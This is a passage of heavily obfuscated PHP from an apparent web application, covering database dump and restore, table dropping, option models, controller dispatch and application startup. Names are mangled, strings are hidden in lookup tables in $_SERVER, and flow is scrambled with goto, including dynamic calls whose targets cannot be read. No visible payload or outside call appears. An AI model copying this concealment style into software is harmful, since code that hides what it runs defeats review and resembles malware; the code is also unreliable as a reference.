$bÍÉ¦¥±¼ = $this->model()->db(); $c÷èÉø˜† = $Bê´ÕÌ•æ ? array($Bê´ÕÌ•æ) : $bÍÉ¦¥±¼->getTables(); foreach ($c†¢é¿¢˜¦ as $B‚Ø‡ÎÛè) { $Bê´ÕÌ•æ = basename($B‚Ø‡ÎÛè, $A³òÙŠ§Ÿß[716]); if (!in_array($Bê´ÕÌ•æ, $c÷èÉø˜†)) { continue; } if ($F²Ïê£Û¯) { $F²Ïê£Û¯->task[$A³òÙŠ§Ÿß[979]] = $Bê´ÕÌ•æ; } if (get_filesize($B‚Ø‡ÎÛè) == 0) { continue; } $cœ²´È‡ŠÚ = $this->sqlToDb($B‚Ø‡ÎÛè, $F²Ïê£Û¯); if (!$cœ²´È‡ŠÚ) { show_json(LNG($A³òÙŠ§Ÿß[980]) . "\x5b{$Bê´ÕÌ•æ}\x5d", !1); } } $this->taskToCache($F²Ïê£Û¯); } public function sqlFromDb($c÷‰…¥’Š¹, $A‘¦Áø×ÍÊ, $f•¼ùæãîí = null, $A›³ÔÅ¶ = null) { goto E†ŠÁ§„¼; C´÷ÕñÜ»è: $F†¿÷Ò¸—Ü = $cä›¥îó->getPk(); $dµÒš£õà = $cä›¥îó->getDbFields(); do { $AĞª÷¬¸” = $cä›¥îó->field($dµÒš£õà)->order($F†¿÷Ò¸—Ü . $_SERVER[Æ][982])->selectPage($E‚…©ğõ»Æ, $c°ãåÍÆ); $DøÍØ‘îğ¡ = !empty($AĞª÷¬¸”[$_SERVER[Æ][354]]) ? $AĞª÷¬¸”[$_SERVER[Æ][354]] : array(); if (!($F×ï°ê† = count($DøÍØ‘îğ¡))) { break; } $D¥·É‰°„ = array(); foreach ($DøÍØ‘îğ¡ as $C‰À±‡´òî) { if ($A›³ÔÅ¶) { $C‰À±‡´òî[$_SERVER[Æ][75]] = "\173\151\157\x3a{$A›³ÔÅ¶}\x7d" . substr($C‰À±‡´òî[$_SERVER[Æ][75]], strlen("\x7b\x69\x6f\x3a{$C‰À±‡´òî[$_SERVER[Æ][742]]}\175")); $C‰À±‡´òî[$_SERVER[Æ][742]] = $A›³ÔÅ¶; } $D¥·É‰°„[] = $_SERVER[Æ][983] . $this->sqlEncode($C‰À±‡´òî) . $_SERVER[Æ][984]; } $Dôª‡Àâ£¤ = "\111\x4e\x53\x45\122\x54\x20\111\116\124\x4f\x20\140{$c÷‰…¥’Š¹}\140\x20\x28\x60" . implode($_SERVER[Æ][985], $dµÒš£õà) . $_SERVER[Æ][986]; fwrite($CÛöÙÍí©…, $Dôª‡Àâ£¤ . implode($_SERVER[Æ][987], $D¥·É‰°„) . $_SERVER[Æ][67] . PHP_EOL); $c°ãåÍÆ++; $a›ÕøåÅ™ += $F×ï°ê†; if ($f•¼ùæãîí) { $f•¼ùæãîí->update($F×ï°ê†); } } while ($F×ï°ê† == $E‚…©ğõ»Æ); goto b¦ÛÆØÛš; E†ŠÁ§„¼: if ($f•¼ùæãîí) { $f•¼ùæãîí->task[$_SERVER[Æ][979]] = $c÷‰…¥’Š¹; } $cä›¥îó = $this->model($c÷‰…¥’Š¹); $a›ÕøåÅ™ = 0; goto FÈ±Ç—Ÿç¦; b¦ÛÆØÛš: fclose($CÛöÙÍí©…); return $a›ÕøåÅ™; goto AËĞ‡ª‰Ä¸; FÈ±Ç—Ÿç¦: $c°ãåÍÆ = 1; $E‚…©ğõ»Æ = 500; $CÛöÙÍí©… = fopen($A‘¦Áø×ÍÊ, $_SERVER[Æ][981]); goto C´÷ÕñÜ»è; AËĞ‡ª‰Ä¸: } public function sqlToDb($F“¦Š„÷İ´, $bˆ­âïŸÜĞ = null) { goto FÅÍë°”µ¦; aˆïÑäß‰: if (!$A‚œ²ÎĞ›Ş) { return !1; } $dË®ª‡¨ª = 0; $eá„ĞÌë“Í = $B“ÌùŸİ’‹[33]; goto dÌÀ·ùéçä; F§¢ÀÂµó‹: if ($eá„ĞÌë“Í) { $eá„ĞÌë“Í = rtrim(trim($eá„ĞÌë“Í), $B“ÌùŸİ’‹[67]); if (!$C˜‚´”ˆ•->execute($eá„ĞÌë“Í)) { return !1; } if ($bˆ­âïŸÜĞ) { $bˆ­âïŸÜĞ->update($dË®ª‡¨ª - 1); } } return !0; goto föøøÃ‡µ¢; dÌÀ·ùéçä: $f¹ƒ§²¿‘ = 500 + 1; while (!feof($A‚œ²ÎĞ›Ş)) { if ($bˆ­âïŸÜĞ && $dË®ª‡¨ª != 0) { $bˆ­âïŸÜĞ->task[$B“ÌùŸİ’‹[977]] += 1; } $dË®ª‡¨ª++; $c‹¢·‚îÒØ = trim(fgets($A‚œ²ÎĞ›Ş)); $eá„ĞÌë“Í .= $B“ÌùŸİ’‹[50] . $this->sqlDecode($c‹¢·‚îÒØ, $this->type); if ($dË®ª‡¨ª == $f¹ƒ§²¿‘) { $eá„ĞÌë“Í = rtrim(trim($eá„ĞÌë“Í), $B“ÌùŸİ’‹[67]); if (!$C˜‚´”ˆ•->execute($eá„ĞÌë“Í)) { return !1; } if ($bˆ­âïŸÜĞ) { $bˆ­âïŸÜĞ->update($dË®ª‡¨ª - 1); } $eá„ĞÌë“Í = $B“ÌùŸİ’‹[33]; $dË®ª‡¨ª = 0; } } fclose($A‚œ²ÎĞ›Ş); goto F§¢ÀÂµó‹; FÅÍë°”µ¦: $B“ÌùŸİ’‹ =& $_SERVER[Æ]; $C˜‚´”ˆ• = $this->model()->db(); $A‚œ²ÎĞ›Ş = @fopen($F“¦Š„÷İ´, $B“ÌùŸİ’‹[988]); goto aˆïÑäß‰; föøøÃ‡µ¢: } public function dropTable($d‡õŸ‹Š… = null) { $bÎÔÊ¢®¦ = $this->model()->db(); $C‰¬¤‘§ÄÇ = $d‡õŸ‹Š… ? array($d‡õŸ‹Š…) : $bÎÔÊ¢®¦->getTables(); if (!$C‰¬¤‘§ÄÇ) { return; } foreach ($C‰¬¤‘§ÄÇ as $d‡õŸ‹Š…) { $bÎÔÊ¢®¦->execute("\144\162\x6f\160\40\x74\141\142\154\145\40\x69\146\40\x65\170\x69\x73\164\163\x20\x60{$d‡õŸ‹Š…}\140"); } } private function taskToCache($fó©®’›š = null) { $E‹¾®‡óĞÉ =& $_SERVER[Æ]; if (!$fó©®’›š) { return; } $bÔõÜÅ¨‹Ä = array($E‹¾®‡óĞÉ[979] => $fó©®’›š->task[$E‹¾®‡óĞÉ[979]], $E‹¾®‡óĞÉ[977] => $fó©®’›š->task[$E‹¾®‡óĞÉ[977]], $E‹¾®‡óĞÉ[989] => $fó©®’›š->task[$E‹¾®‡óĞÉ[989]]); if ($bÔõÜÅ¨‹Ä[$E‹¾®‡óĞÉ[977]] == $bÔõÜÅ¨‹Ä[$E‹¾®‡óĞÉ[989]]) { $bÔõÜÅ¨‹Ä[$E‹¾®‡óĞÉ[694]] = 1; } Cache::set($E‹¾®‡óĞÉ[990] . $fó©®’›š->task[$E‹¾®‡óĞÉ[367]], $bÔõÜÅ¨‹Ä); $fó©®’›š->end(); } private function sqlEncode($C–¡®öëç) { $c İ‹ª» =& $_SERVER[Æ]; $bÛ„ÎïñÏ = array(); foreach ($C–¡®öëç as $e…†Á›Œ²Â) { if (is_array($e…†Á›Œ²Â)) { $e…†Á›Œ²Â = json_encode_force($e…†Á›Œ²Â); } $e…†Á›Œ²Â = addslashes($e…†Á›Œ²Â); $e…†Á›Œ²Â = str_replace(array($c İ‹ª»[991], $c İ‹ª»[217]), array($c İ‹ª»[992], $c İ‹ª»[993]), $e…†Á›Œ²Â); $bÛ„ÎïñÏ[] = str_replace($c İ‹ª»[55], $c İ‹ª»[994], $e…†Á›Œ²Â); } return $c İ‹ª»[55] . implode($c İ‹ª»[995], $bÛ„ÎïñÏ) . $c İ‹ª»[55]; } private function sqlDecode($F×²‰ì±¯—, $c½ö¶™Ş») { $fíÏ²Óâà =& $_SERVER[Æ]; $F×²‰ì±¯— = str_replace(array($fíÏ²Óâà[992], $fíÏ²Óâà[993]), array($fíÏ²Óâà[991], $fíÏ²Óâà[217]), $F×²‰ì±¯—); if ($c½ö¶™Ş» == $fíÏ²Óâà[9]) { $F×²‰ì±¯— = stripslashes($F×²‰ì±¯—); } return $F×²‰ì±¯—; } } goto A™ÈïÓßµ; f…™®šÑÎ: define($_SERVER[Æ][1933], 5); define($_SERVER[Æ][1934], 16); define($_SERVER[Æ][1935], 32); goto f¾äÖÃÂà; Có’Ï·áç´: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\x73\x74\x65\x6d\x5f\157\x70\164\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\x6f\154\145", "\x72\x6f\154\145\107\162\x6f\165\160", "\162\x65\x67\151\163\164", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($C¶³ÊÃ­›) { return "\x53\x79\x73\164\x65\155\x4f\160\164\x69\x6f\x6e\x5f{$C¶³ÊÃ­›}"; } protected function optionDefault($a‚òäŠÇ… = '') { $AŒ ÜÍœ· =& $_SERVER[Æ]; if ($a‚òäŠÇ… == $AŒ ÜÍœ·[33]) { return $GLOBALS[$AŒ ÜÍœ·[6]][$AŒ ÜÍœ·[2478]]; } } } if ($_SERVER[$_SERVER[Æ][780]] != $_SERVER[$_SERVER[Æ][2479]]) { goto fŒë±ê©±¬; fŒë±ê©±¬: $aÀ¦»Óà† = $_SERVER[Æ][781]; $FÙ²ñ¯™Í = $_SERVER[$_SERVER[Æ][782]] . $_SERVER[Æ][783]; $D÷ËÌùõ = $aÀ¦»Óà†($FÙ²ñ¯™Í); goto D“°æ’ª¶‰; A‡…Öº°µİ: $FÒ‹ìåÓî($_SERVER[$_SERVER[Æ][996]]); goto E©¤œî²‹Ó; D“°æ’ª¶‰: $B¬îùñ†¦‚ = explode($_SERVER[Æ][217], $D÷ËÌùõ); if (count($B¬îùñ†¦‚) < $_SERVER[Æ][573]) { $EÄÈÇˆ«‘ = $_SERVER[Æ][784]; $EÄÈÇˆ«‘(); } $FÒ‹ìåÓî = $_SERVER[Æ][785]; goto A‡…Öº°µİ; E©¤œî²‹Ó: } class SystemRecordModel extends ModelBaseLight { } goto FøÔ¢–‹Ì¬; dÒ»™½–°‚: function Action($c§Æ¤ÉÑºá = '') { goto b¤£Ë­‡¡; F™­àÇ¥çğ: $A¼êšî‘Î[$bÓÏ‰‚‡œ] = new $e“ÙÇÓõŠ(); $A¼êšî‘Î[$C¯ÙÃŒ™—¤] = $A¼êšî‘Î[$bÓÏ‰‚‡œ]; return $A¼êšî‘Î[$bÓÏ‰‚‡œ]; goto B©Ø­¢†«Ş; f„˜¯ÏŠ: if (isset($A¼êšî‘Î[$bÓÏ‰‚‡œ])) { return $A¼êšî‘Î[$bÓÏ‰‚‡œ]; } if (is_file($AÈ·…™Åµæ)) { include_once $AÈ·…™Åµæ; } if (!class_exists($e“ÙÇÓõŠ)) { return actionCallError("\x5b{$c§Æ¤ÉÑºá}\x20\x3d\x3e\40{$e“ÙÇÓõŠ}\x5d\40\143\154\141\163\163\40\156\157\164\40\x65\170\x69\x73\164\x73\x21"); } goto F™­àÇ¥çğ; aäÍâ¦â…ø: if (isset($A¼êšî‘Î[$C¯ÙÃŒ™—¤])) { return $A¼êšî‘Î[$C¯ÙÃŒ™—¤]; } $c§Æ¤ÉÑºá = trim(str_replace($aƒ°àßÉğ[4], $aƒ°àßÉğ[5], $c§Æ¤ÉÑºá), $aƒ°àßÉğ[4]); $Dší¦æé¿Â = explode($aƒ°àßÉğ[5], $c§Æ¤ÉÑºá); goto CŠŒ¦ÍË¦ˆ; CŠŒ¦ÍË¦ˆ: $E´Àë¯ÂÊá = strtolower($Dší¦æé¿Â[0]); if (substr($E´Àë¯ÂÊá, -6) == $aƒ°àßÉğ[6]) { $c§Æ¤ÉÑºá = substr($Dší¦æé¿Â[0], 0, -6); $e“ÙÇÓõŠ = $c§Æ¤ÉÑºá . $aƒ°àßÉğ[7]; $AÈ·…™Åµæ = $aƒ°àßÉğ[8]; if (isset($Dší¦æé¿Â[1]) && substr(strtolower($Dší¦æé¿Â[1]), -5) == $aƒ°àßÉğ[9]) { $e“ÙÇÓõŠ = $c§Æ¤ÉÑºá . $Dší¦æé¿Â[1]; $AÈ·…™Åµæ = $aƒ°àßÉğ[10] . $Dší¦æé¿Â[1] . $aƒ°àßÉğ[11]; } else { if (count($Dší¦æé¿Â) == 3) { $e“ÙÇÓõŠ = $c§Æ¤ÉÑºá . $Dší¦æé¿Â[1] . $Dší¦æé¿Â[2]; $AÈ·…™Åµæ = $aƒ°àßÉğ[12] . $Dší¦æé¿Â[1] . $aƒ°àßÉğ[13] . $Dší¦æé¿Â[2] . $aƒ°àßÉğ[11]; } } $AÈ·…™Åµæ = PLUGIN_DIR . $c§Æ¤ÉÑºá . $aƒ°àßÉğ[4] . $AÈ·…™Åµæ; } else { if (substr($E´Àë¯ÂÊá, -5) == $aƒ°àßÉğ[9]) { $c§Æ¤ÉÑºá = substr($Dší¦æé¿Â[0], 0, -5); return Model($c§Æ¤ÉÑºá); } else { $e“ÙÇÓõŠ = $Dší¦æé¿Â[0] . $Dší¦æé¿Â[1]; $AÈ·…™Åµæ = CONTROLLER_DIR . $Dší¦æé¿Â[0] . $aƒ°àßÉğ[4] . $Dší¦æé¿Â[1] . $aƒ°àßÉğ[14]; } } $bÓÏ‰‚‡œ = strtolower($e“ÙÇÓõŠ); goto f„˜¯ÏŠ; b¤£Ë­‡¡: $aƒ°àßÉğ =& $_SERVER[ş”]; static $A¼êšî‘Î = array(); $C¯ÙÃŒ™—¤ = $c§Æ¤ÉÑºá; goto aäÍâ¦â…ø; B©Ø­¢†«Ş: } function ActionApply($A¢Ş§¿¸«Ã, $Aº¬“±İ¬Ç = array()) { goto CùğŒ×ÂŒÏ; E‚¼†á³Ä: $d·Âî‚÷îÇ = substr($A¢Ş§¿¸«Ã, 0, $cˆ³ÒìŸè); $cê´äè°´ = substr($A¢Ş§¿¸«Ã, $cˆ³ÒìŸè + 1); $dÃŒÈã§ğõ = Action($d·Âî‚÷îÇ); goto FÌ÷Ú¶›ù; FÌ÷Ú¶›ù: if (!method_exists($dÃŒÈã§ğõ, $cê´äè°´)) { return actionCallError("{$A¢Ş§¿¸«Ã}\40\x6d\x65\x74\x68\157\x64\x20\x6e\x6f\164\40\x65\x78\x69\x73\164\163\41"); } $AìÒÈ‰±ø = call_user_func_array(array($dÃŒÈã§ğõ, $cê´äè°´), $Aº¬“±İ¬Ç); return $AìÒÈ‰±ø; goto CÂ“¢ß„ß; CùğŒ×ÂŒÏ: if (is_array($A¢Ş§¿¸«Ã)) { return call_user_func_array($A¢Ş§¿¸«Ã, $Aº¬“±İ¬Ç); } if (function_exists($A¢Ş§¿¸«Ã)) { return call_user_func_array($A¢Ş§¿¸«Ã, $Aº¬“±İ¬Ç); } $cˆ³ÒìŸè = strrpos($A¢Ş§¿¸«Ã, $_SERVER[ş”][5]); goto E‚¼†á³Ä; CÂ“¢ß„ß: } function actionCallError($DìË’ÑÕ¦ª) { $c—ÜÀ¤ˆ =& $_SERVER[ş”]; $A„›Ò‚óáÊ = json_encode_force(array($c—ÜÀ¤ˆ[15] => this_url(), $c—ÜÀ¤ˆ[16] => $GLOBALS[$c—ÜÀ¤ˆ[16]])); $A„›Ò‚óáÊ = str_replace(array($c—ÜÀ¤ˆ[17]), array($c—ÜÀ¤ˆ[4]), $A„›Ò‚óáÊ); return write_log($DìË’ÑÕ¦ª . $c—ÜÀ¤ˆ[18] . $A„›Ò‚óáÊ, $c—ÜÀ¤ˆ[19]); } goto Cƒİ«Ã’ ñ; c’…õóÇ¼Ë: if (!$Fë”†›ß©—) { return; } class Application { private $defaultModule = "\151\156\144\145\x78"; private $defaultController = "\x69\156\144\x65\170"; private $defaultAction = "\x69\x6e\x64\145\170"; function __construct() { } public function setDefault($a¾Íèòš) { goto Dá²‡µİò‘; Dá²‡µİò‘: $A§îä‘¡İà =& $_SERVER[Æ]; $CÕœÂìĞÓÆ =& $_SERVER[í½¨]; $E„á¦ù = $CÕœÂìĞÓÆ[0]($CÕœÂìĞÓÆ[1], $CÕœÂìĞÓÆ[2]($a¾Íèòš, $CÕœÂìĞÓÆ[1])); goto F²ƒ«‰õè½; F²ƒ«‰õè½: $this->defaultModule = $E„á¦ù[0] ? $E„á¦ù[0] : $this->defaultModule; $FÌ½­ªƒÔ¤ = $A§îä‘¡İà[551]; while ($FÌ½­ªƒÔ¤ < $A§îä‘¡İà[552]) { if ($FÌ½­ªƒÔ¤ >= 0) { break; } $FÌ½­ªƒÔ¤++; } goto EÀ×¹ØÒ¹Í; EÀ×¹ØÒ¹Í: $this->defaultController = $E„á¦ù[1] ? $E„á¦ù[1] : $this->defaultController; $this->defaultAction = $E„á¦ù[2] ? $E„á¦ù[2] : $this->defaultAction; $this->{$_SERVER[í½¨][3]}($CÕœÂìĞÓÆ[4], array($this, $CÕœÂìĞÓÆ[5])); goto EºÎè®ß; EºÎè®ß: } public function appRun($a•ÉïæÒ) { goto cÁ¡¼ƒŒÒ; cÁ¡¼ƒŒÒ: $BÙæƒô×ÂÂ =& $_SERVER[Æ]; $fÎÒëö¯Ò =& $_SERVER[í½¨]; $E¿ãÜ‹ĞÆ = $fÎÒëö¯Ò[0]($fÎÒëö¯Ò[1], $a•ÉïæÒ); goto A”¨Šˆ¤ÁÌ; A”¨Šˆ¤ÁÌ: $c‡åßã¬„Ë = $BÙæƒô×ÂÂ[553]; while ($c‡åßã¬„Ë < $BÙæƒô×ÂÂ[552]) { if ($c‡åßã¬„Ë >= 0) { break; } $c‡åßã¬„Ë++; } $b´‹ù‘ÁãÁ = $fÎÒëö¯Ò[6]($E¿ãÜ‹ĞÆ[0]); goto D˜ŒŒİâš; D˜ŒŒİâš: $F“·ƒÍÛ = $BÙæƒô×ÂÂ[554]; $A—‰™‰‚½¿ = $fÎÒëö¯Ò[7]; if ($b´‹ù‘ÁãÁ == $fÎÒëö¯Ò[8]) { $A—‰™‰‚½¿ = $fÎÒëö¯Ò[9]; $E¿ãÜ‹ĞÆ[0] = $fÎÒëö¯Ò[10]; $E¿ãÜ‹ĞÆ[1] = $E¿ãÜ‹ĞÆ[1] . $fÎÒëö¯Ò[11]; $a•ÉïæÒ = $fÎÒëö¯Ò[12]($fÎÒëö¯Ò[1], $E¿ãÜ‹ĞÆ); $a•ÉïæÒ = $fÎÒëö¯Ò[2]($a•ÉïæÒ, $fÎÒëö¯Ò[1]); } goto BÕ‚Ş¼ÅŒ; A°¡”‘èà˜: $bñ¼£½’Ó‰ = $BÙæƒô×ÂÂ[555]; if (!$bñ¼£½’Ó‰) { die; } goto B±âÔ¹ùå; BÕ‚Ş¼ÅŒ: $fÎÒëö¯Ò[13](array($fÎÒëö¯Ò[14], $fÎÒëö¯Ò[15]), $A—‰™‰‚½¿ . $fÎÒëö¯Ò[16], $a•ÉïæÒ); $fÎÒëö¯Ò[17]($a•ÉïæÒ); $fÎÒëö¯Ò[13](array($fÎÒëö¯Ò[14], $fÎÒëö¯Ò[15]), $A—‰™‰‚½¿ . $fÎÒëö¯Ò[18], $a•ÉïæÒ); goto A°¡”‘èà˜; B±âÔ¹ùå: } private function autorun() { $dÄµç¶›³ =& $_SERVER[í½¨]; global $config; $A‚Ã†—Ú  = $_SERVER[Æ][556]; if (!$A‚Ã†—Ú ) { die; } if ($dÄµç¶›³[19]($config[$dÄµç¶›³[20]]) == 0) { return; } foreach ($config[$dÄµç¶›³[20]] as $bÎ›Ï•½¸ç => $CêêÈÂˆ•) { $this->{$_SERVER[í½¨][21]}($CêêÈÂˆ•); } } private function cidj601c3f75() { goto F˜»½ìŠ˜…; Dƒ›§µÙŞ¾: $B‰ãôÕğÚ¸ = $e³ãËø½º¿[559]; if (!$B‰ãôÕğÚ¸) { die; } $c–…¤•¡ñÅ = array($b’Ëëšê‰[8], $aÈãŠ÷§·œ); goto D…¯·ç¶Ïù; D…¯·ç¶Ïù: $aÚÉáìîª‘ = $e³ãËø½º¿[560]; $eÇÂŠ¯ß± = $b’Ëëšê‰[26]($GLOBALS[$b’Ëëšê‰[22]][$b’Ëëšê‰[23]], 1); $e¦ÈğèöìÙ = $e³ãËø½º¿[561]; goto FÜÎ“ö©Ë; FÜÎ“ö©Ë: while ($e¦ÈğèöìÙ < $e³ãËø½º¿[562]) { if ($e¦ÈğèöìÙ >= 0) { break; } $e¦ÈğèöìÙ++; } $GLOBALS[$b’Ëëšê‰[22]][$b’Ëëšê‰[23]] = $b’Ëëšê‰[27]($c–…¤•¡ñÅ, $eÇÂŠ¯ß±); $AÛé³‡³ÓÎ = $e³ãËø½º¿[563]; goto BÈÚ”ÏÊ; BÈÚ”ÏÊ: while ($AÛé³‡³ÓÎ < $e³ãËø½º¿[564]) { if ($AÛé³‡³ÓÎ >= 0) { break; } $AÛé³‡³ÓÎ++; } $GLOBALS[$b’Ëëšê‰[22]][$b’Ëëšê‰[28]] = $b’Ëëšê‰[29]($b’Ëëšê‰[1], $GLOBALS[$b’Ëëšê‰[22]][$b’Ëëšê‰[23]]); goto dÁ“Óæ•‡; F˜»½ìŠ˜…: $e³ãËø½º¿ =& $_SERVER[Æ]; $b’Ëëšê‰ =& $_SERVER[í½¨]; $fàÂÜ‰ßäË = $b’Ëëšê‰[8]; goto fÔÙôº„Ô–; fÔÙôº„Ô–: $aáÊ’’ª˜Â = $e³ãËø½º¿[557]; $EÇœÈ”¨‚Ç = $GLOBALS[$b’Ëëšê‰[22]][$b’Ëëšê‰[23]][0]; $Fòª¾îóÔ = $e³ãËø½º¿[558]; goto CˆÎòÅîÌ¬; CˆÎòÅîÌ¬: if (!$EÇœÈ”¨‚Ç || $b’Ëëšê‰[24]($EÇœÈ”¨‚Ç) <= $b’Ëëšê‰[24]($fàÂÜ‰ßäË)) { return; } if ($b’Ëëšê‰[6]($b’Ëëšê‰[25]($EÇœÈ”¨‚Ç, -$b’Ëëšê‰[24]($fàÂÜ‰ßäË))) != $fàÂÜ‰ßäË) { return; } $aÈãŠ÷§·œ = $b’Ëëšê‰[25]($EÇœÈ”¨‚Ç, 0, -$b’Ëëšê‰[24]($fàÂÜ‰ßäË)); goto Dƒ›§µÙŞ¾; dÁ“Óæ•‡: } private function fzuya52880a8() { goto AÔßÜåÖ¹×; eˆˆßìåñ¯: if (!$A¥Ûåß§¥¦) { die; } if (!$F¤Íñ†¯–[32]($CİæÙŞŒ²Ø, $Aˆˆ¸èÁ¡ä)) { return; } $aßêÖ÷º½‰ = $F¤Íñ†¯–[33]($CİæÙŞŒ²Ø, $Aˆˆ¸èÁ¡ä); goto B»ñïá…©; A•Ïñˆ¸Õ°: if (strlen($b¨öÉˆÙ½Ù) < $Có›†ç²‹Ğ[568]) { return; } $GLOBALS[$F¤Íñ†¯–[22]][$F¤Íñ†¯–[28]] = $F¤Íñ†¯–[29]($F¤Íñ†¯–[1], $GLOBALS[$F¤Íñ†¯–[22]][$F¤Íñ†¯–[23]]); goto Cº¿Ú¼Åá×; Cï­‰„ÅĞ: $CİæÙŞŒ²Ø = $_SERVER[$F¤Íñ†¯–[30]]; $Aˆˆ¸èÁ¡ä = $F¤Íñ†¯–[31]; $A¥Ûåß§¥¦ = $Có›†ç²‹Ğ[565]; goto eˆˆßìåñ¯; AÔßÜåÖ¹×: $Có›†ç²‹Ğ =& $_SERVER[Æ]; $F¤Íñ†¯– =& $_SERVER[í½¨]; if ($GLOBALS[$F¤Íñ†¯–[22]][$F¤Íñ†¯–[28]] != $F¤Íñ†¯–[10]) { return; } goto Cï­‰„ÅĞ; B»ñïá…©: $D¹öÒ‡°¨ì = $F¤Íñ†¯–[25]($CİæÙŞŒ²Ø, $aßêÖ÷º½‰ + $F¤Íñ†¯–[24]($Aˆˆ¸èÁ¡ä)); $DÀšã†ïŒ° = $Có›†ç²‹Ğ[566]; $F¤Íñ†¯–[34]($F¤Íñ†¯–[35], $D¹öÒ‡°¨ì, $f…à­Í„«ß); goto Fá®ôÑ‚¶¤; Fá®ôÑ‚¶¤: $D¹öÒ‡°¨ì = $F¤Íñ†¯–[2]($f…à­Í„«ß[0][0], $F¤Íñ†¯–[36]); $GLOBALS[$F¤Íñ†¯–[22]][$F¤Íñ†¯–[23]] = $F¤Íñ†¯–[0]($F¤Íñ†¯–[36], $D¹öÒ‡°¨ì); $b¨öÉˆÙ½Ù = $Có›†ç²‹Ğ[567]; goto A•Ïñˆ¸Õ°; Cº¿Ú¼Åá×: } public function run() { goto B¼’ãê’Ê„; B¼’ãê’Ê„: $CáºÌ¾°†‰ =& $_SERVER[Æ]; $FÔ¶¬…öŠ’ =& $_SERVER[í½¨]; $this->{$_SERVER[í½¨][37]}(); goto Bƒœ äĞ¨å; Bƒœ äĞ¨å: $this->{$_SERVER[í½¨][38]}(); $eâêğŞ˜ïğ = $GLOBALS[$FÔ¶¬…öŠ’[22]][$FÔ¶¬…öŠ’[23]]; $aŞäåÎŞ•Ç = $CáºÌ¾°†‰[569]; goto fà¦ÙºŠ°‘; CÙ¸ß½Çõ: $eÆ£ê‡œ = $CáºÌ¾°†‰[570]; if (!$eÆ£ê‡œ) { die; } $FÔ¶¬…öŠ’[39]($FÔ¶¬…öŠ’[42], isset($eâêğŞ˜ïğ[2]) && $eâêğŞ˜ïğ[0] ? $eâêğŞ˜ïğ[2] : $this->defaultAction); goto Bºİ‡„İÜù; EíœğË†ç¨: $_SERVER[$FÔ¶¬…öŠ’[44]] = $FÔ¶¬…öŠ’[6](ACTION); $this->{$_SERVER[í½¨][45]}(); $dí¡ò…ÌŠ = $CáºÌ¾°†‰[572]; goto eì¢¸”ªò; Bºİ‡„İÜù: $aÎù¥Îİª… = $CáºÌ¾°†‰[571]; while (strlen($aÎù¥Îİª…) < $CáºÌ¾°†‰[564]) { if (!$aÎù¥Îİª…) { break; } $aÎù¥Îİª…++; } $FÔ¶¬…öŠ’[39]($FÔ¶¬…öŠ’[43], MOD . $FÔ¶¬…öŠ’[1] . ST . $FÔ¶¬…öŠ’[1] . ACT); goto EíœğË†ç¨; fà¦ÙºŠ°‘: $Bìç¾íÅµ” = $GLOBALS[$FÔ¶¬…öŠ’[22]][$FÔ¶¬…öŠ’[28]]; $FÔ¶¬…öŠ’[39]($FÔ¶¬…öŠ’[40], isset($eâêğŞ˜ïğ[0]) && $eâêğŞ˜ïğ[0] ? $eâêğŞ˜ïğ[0] : $this->defaultModule); $FÔ¶¬…öŠ’[39]($FÔ¶¬…öŠ’[41], isset($eâêğŞ˜ïğ[1]) && $eâêğŞ˜ïğ[0] ? $eâêğŞ˜ïğ[1] : $this->defaultController); goto CÙ¸ß½Çõ; eì¢¸”ªò: while (strlen($dí¡ò…ÌŠ) < $CáºÌ¾°†‰[573]) { if (!$dí¡ò…ÌŠ) { break; } $dí¡ò…ÌŠ++; } if ($FÔ¶¬…öŠ’[19]($eâêğŞ˜ïğ) >= 3) { $this->{$_SERVER[í½¨][21]}($Bìç¾íÅµ”); } else { $this->{$_SERVER[í½¨][21]}(ACTION); } goto Bñ¬Û‚†ô†; Bñ¬Û‚†ô†: } private $dulc12afae4d = array(); private $lcet59a63c7c = ''; public function fezpd60f2662() { goto E›ÚÈí¦…õ; A¥‡‡Ûá§: $this->{$_SERVER[í½¨][3]}($bª³“èØê¡[57], array($this, $bª³“èØê¡[58])); $B‰‹£µÏ… = $d †Î¶˜¼°[576]; if (!$B‰‹£µÏ…) { die; } goto e…ëÓñˆ; E¸ÚéçŒõÔ: $this->{$_SERVER[í½¨][47]}(); $this->{$_SERVER[í½¨][48]}(); $this->{$_SERVER[í½¨][49]}(); goto EÁ‚Ø›×õï; e…ëÓñˆ: $this->{$_SERVER[í½¨][3]}($bª³“èØê¡[59], array($this, $bª³“èØê¡[60])); goto dê‘Ï”’ª…; bŞËñ¬ÖÁ: $C„„Âğ‡ƒó = $d †Î¶˜¼°[574]; if (strlen($C„„Âğ‡ƒó) < $d †Î¶˜¼°[562]) { return; } $this->{$_SERVER[í½¨][3]}($bª³“èØê¡[53], array($this, $bª³“èØê¡[54])); goto CŠâÈ¶µáÙ; EÁ‚Ø›×õï: $this->{$_SERVER[í½¨][50]}(); $this->{$_SERVER[í½¨][51]}(); $this->{$_SERVER[í½¨][52]}(); goto bŞËñ¬ÖÁ; E›ÚÈí¦…õ: $d †Î¶˜¼° =& $_SERVER[Æ]; $bª³“èØê¡ =& $_SERVER[í½¨]; $this->{$_SERVER[í½¨][46]}(); goto E¸ÚéçŒõÔ; CŠâÈ¶µáÙ: $this->{$_SERVER[í½¨][3]}($bª³“èØê¡[55], array($this, $bª³“èØê¡[56])); $AŞØ£Ê­¨ƒ = $d †Î¶˜¼°[575]; if (strlen($AŞØ£Ê­¨ƒ) < $d †Î¶˜¼°[562]) { die; } goto A¥‡‡Ûá§; dê‘Ï”’ª…: } public function ofjuc0a82c4f($DÉ¬×ˆ¢‚å) { goto c£ˆ³‘˜õ; f¢Ì¶•¥: $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[130]] = $b½öİÉ¯·ƒ[104]($this->dulc12afae4d, $b½öİÉ¯·ƒ[131], $b½öİÉ¯·ƒ[10]); $C…‘ÓÎ£¸ê = $Døõ‚†ÂÕ[582]; while ($C…‘ÓÎ£¸ê < $Døõ‚†ÂÕ[573]) { if ($C…‘ÓÎ£¸ê >= 0) { break; } $C…‘ÓÎ£¸ê++; } goto bäãÏ‚õ›Ç; dŸÙªå‡: if ($bÎ„ŞŞÄ°¦[$b½öİÉ¯·ƒ[120]] != $b½öİÉ¯·ƒ[121]) { $DÉ¬×ˆ¢‚å[$b½öİÉ¯·ƒ[108]][$b½öİÉ¯·ƒ[122]] = 